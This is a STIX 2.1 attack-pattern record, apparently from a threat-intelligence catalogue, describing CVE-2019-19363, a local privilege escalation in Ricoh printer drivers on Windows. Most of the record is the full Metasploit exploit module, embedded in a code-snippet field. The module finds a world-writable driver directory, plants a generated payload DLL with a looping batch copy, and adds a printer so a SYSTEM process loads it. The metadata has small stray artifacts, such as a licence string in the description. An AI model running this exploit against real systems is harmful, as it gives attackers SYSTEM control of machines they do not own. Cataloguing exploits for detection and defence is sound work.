{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5165df63-121f-4008-9e11-ebde16cdadbf",
    "created": "2024-08-14T16:49:24.94987Z",
    "modified": "2024-08-14T16:49:24.949874Z",
    "name": "Ricoh Driver Privilege Escalation",
    "description": " Various Ricoh printer drivers allow escalation of privileges on Windows systems.  For vulnerable drivers, a low-privileged user can read/write files within the `RICOH_DRV` directory and its subdirectories.  `PrintIsolationHost.exe`, a Windows process running as NT AUTHORITY\\SYSTEM, loads driver-specific DLLs during the installation of a printer. A user can elevate to SYSTEM by writing a malicious DLL to the vulnerable driver directory and adding a new printer with a vulnerable driver.  This module leverages the `prnmngr.vbs` script to add and delete printers. Multiple runs of this module may be required given successful exploitation is time-sensitive.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ricoh_driver_privesc.rb",
            "external_id": "ricoh_driver_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-19363"
        },
        {
            "source_name": "reference",
            "url": "https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Ricoh Driver Privilege Escalation',\n        'Description' => %q{\n          Various Ricoh printer drivers allow escalation of\n          privileges on Windows systems.\n\n          For vulnerable drivers, a low-privileged user can\n          read/write files within the `RICOH_DRV` directory\n          and its subdirectories.\n\n          `PrintIsolationHost.exe`, a Windows process running\n          as NT AUTHORITY\\SYSTEM, loads driver-specific DLLs\n          during the installation of a printer. A user can\n          elevate to SYSTEM by writing a malicious DLL to\n          the vulnerable driver directory and adding a new\n          printer with a vulnerable driver.\n\n          This module leverages the `prnmngr.vbs` script\n          to add and delete printers. Multiple runs of this\n          module may be required given successful exploitation\n          is time-sensitive.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Alexander Pudwill', # discovery & PoC\n          'Pentagrid AG',       # PoC\n          'Shelby Pace'         # msf module\n        ],\n        'References' => [\n          [ 'CVE', '2019-19363'],\n          [ 'URL', 'https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/']\n        ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Platform' => 'win',\n        'Payload' => {\n        },\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [\n            'Windows', { 'Arch' => [ ARCH_X86, ARCH_X64 ] }\n          ]\n        ],\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK ],\n          'Reliability' => [ UNRELIABLE_SESSION ],\n          'Stability' => [ SERVICE_RESOURCE_LOSS ]\n        },\n        'DisclosureDate' => '2020-01-22',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    @driver_path = ''\n    dir_name = \"C:\\\\ProgramData\\\\RICOH_DRV\"\n\n    return CheckCode::Safe('No Ricoh driver directory found') unless directory?(dir_name)\n\n    driver_names = dir(dir_name)\n\n    return CheckCode::Detected(\"Detected Ricoh driver directory, but no installed drivers\") unless driver_names.length\n\n    vulnerable = false\n    driver_names.each do |driver_name|\n      full_path = \"#{dir_name}\\\\#{driver_name}\\\\_common\\\\dlz\"\n      next unless directory?(full_path)\n\n      @driver_path = full_path\n\n      res = cmd_exec(\"icacls \\\"#{@driver_path}\\\"\")\n      next unless res.include?('Everyone:')\n      next unless res.match(/\\(F\\)/)\n\n      vulnerable = true\n      break\n    end\n\n    return CheckCode::Detected('Ricoh driver directory does not have full permissions') unless vulnerable\n\n    vprint_status(\"Vulnerable driver directory: #{@driver_path}\")\n    CheckCode::Appears('Ricoh driver directory has full permissions')\n  end\n\n  def add_printer(driver_name)\n    fail_with(Failure::NotFound, 'Printer driver script not found') unless file?(@script_path)\n\n    dll_data = generate_payload_dll\n    dll_path = \"#{@driver_path}\\\\headerfooter.dll\"\n\n    temp_path = expand_path('%TEMP%\\\\headerfooter.dll')\n    vprint_status(\"Writing dll to #{temp_path}\")\n\n    bat_file_path = expand_path(\"%TEMP%\\\\#{Rex::Text.rand_text_alpha(5..9)}.bat\")\n    cp_cmd = \"copy /y \\\"#{temp_path}\\\" \\\"#{dll_path}\\\"\"\n    bat_file = <<~HEREDOC\n      :repeat\n      #{cp_cmd} && goto :repeat\n    HEREDOC\n\n    write_file(bat_file_path, bat_file)\n    write_file(temp_path, dll_data)\n    register_files_for_cleanup(bat_file_path, temp_path)\n\n    script_cmd = \"cscript \\\"#{@script_path}\\\" -a -p \\\"#{@printer_name}\\\" -m \\\"#{driver_name}\\\" -r \\\"lpt1:\\\"\"\n    bat_cmd = \"cmd.exe /c \\\"#{bat_file_path}\\\"\"\n    print_status(\"Adding printer #{@printer_name}...\")\n    client.sys.process.execute(script_cmd, nil, { 'Hidden' => true })\n    vprint_status(\"Executing script...\")\n    cmd_exec(bat_cmd)\n  rescue Rex::Post::Meterpreter::RequestError => e\n    e_log(\"#{e.class} #{e.message}\\n#{e.backtrace * \"\\n\"}\")\n  end\n\n  def exploit\n    fail_with(Failure::None, 'Already running as SYSTEM') if is_system?\n\n    fail_with(Failure::None, 'Must have a Meterpreter session to run this module') unless session.type == 'meterpreter'\n\n    if sysinfo['Architecture'] != payload.arch.first\n      fail_with(Failure::BadConfig, 'The payload should use the same architecture as the target driver')\n    end\n\n    @printer_name = Rex::Text.rand_text_alpha(5..9)\n    @script_path = \"C:\\\\Windows\\\\System32\\\\Printing_Admin_Scripts\\\\en-US\\\\prnmngr.vbs\"\n    drvr_name = @driver_path.split('\\\\')\n    drvr_name_idx = drvr_name.index('RICOH_DRV') + 1\n    drvr_name = drvr_name[drvr_name_idx]\n\n    add_printer(drvr_name)\n  end\n\n  def cleanup\n    print_status(\"Deleting printer #{@printer_name}\")\n    Rex.sleep(3)\n    delete_cmd = \"cscript \\\"#{@script_path}\\\" -d -p \\\"#{@printer_name}\\\"\"\n    client.sys.process.execute(delete_cmd, nil, { 'Hidden' => true })\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-01-22",
    "x_mitre_platforms": [
        "win'"
    ]
}